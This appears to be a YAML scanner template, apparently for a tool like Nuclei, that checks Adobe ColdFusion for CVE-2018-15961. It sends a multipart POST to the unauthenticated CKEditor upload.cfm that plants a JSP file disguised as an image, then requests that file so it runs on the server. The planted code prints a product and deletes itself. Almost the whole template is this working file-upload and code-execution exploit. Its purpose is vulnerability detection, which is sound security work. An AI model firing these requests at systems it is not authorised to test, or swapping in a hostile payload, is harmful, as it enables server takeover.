id: yaml-poc-adobe-coldfusion-logical-CVE-2018-15961
info:
  name: Yaml Poc Adobe Coldfusion Logical Cve 2018 15961
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-adobe-coldfusion-logical-CVE-2018-15961'
  tags: cve
  classification:
    cve-id: CVE-2018-15961
  reference:
  - http://www.securityfocus.com/bid/105314
  - http://www.securitytracker.com/id/1041621
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15961
  - https://helpx.adobe.com/security/products/coldfusion/apsb18-33.html
  - https://www.exploit-db.com/exploits/45979/
http:
- method: POST
  path:
  - /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm
  body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
    \ name=\"path\"\r\n\npath\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition:\
    \ form-data; name=\"file\"; filename=\"{{randname}}.jsp\"\r\nContent-Type: image/jpeg\r\
    \n\r\n<%out.print({{r1}} * {{r2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\
    \n------WebKitFormBoundary{{rboundary}}--\r\n"
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: GET
  path:
  - /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/{{randname}}.jsp
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
